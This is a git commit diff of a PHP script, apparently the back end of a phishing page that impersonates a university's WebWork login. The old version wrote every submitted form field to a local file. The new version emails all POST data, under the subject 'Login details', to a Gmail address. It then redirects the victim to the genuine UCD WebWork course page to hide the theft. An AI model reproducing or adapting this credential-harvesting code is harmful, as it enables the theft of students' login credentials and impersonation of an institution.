6b388a471354decc507b9901eb0368e830e151dd
webworkucd <131904937+webworkucd@users.noreply.github.com>
2023-04-26 18:55:10 +0100

    Update post.php

--- post.php
+++ post.php
@@ -1,17 +1,18 @@
 <?php
-$file = fopen("your—password.txt", "a");
-fwrite($file, "\t\t\t\t\t\t");
-fwrite($file, "\r\n");
-foreach($_POST as $key=>$vatue) {
-    fwrite($file, "\t\t\t\t\t\t");
-    fwrite($file, $key);
-    fwrite($file, "=");
-    fwrite($file, $vatue);
-    fwrite($file, "\r\n");
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    $to = 'webwork.org@gmail.com'; // Replace with your own email address
+    $subject = 'Login details'; // Replace with your own subject line
+
+    $message = '';
+    foreach ($_POST as $key => $value) {
+        $message .= $key . ": " . $value . "\n";
+    }
+
+    // Use mail() function to send email
+    mail($to, $subject, $message);
+
+    // Redirect user to a different page after form submission
+    header('Location:https://webwork.ucd.ie/webwork2/Math-10260-Greferath/');
+    exit;
 }
-fwrite($file, "\r\n");
-fwrite($file, "\t\t\t\t\t\t");
-fclose($file);
-header("Location:https://webwork.ucd.ie/webwork2/Math-10260-Greferath/");
-die();
 ?>
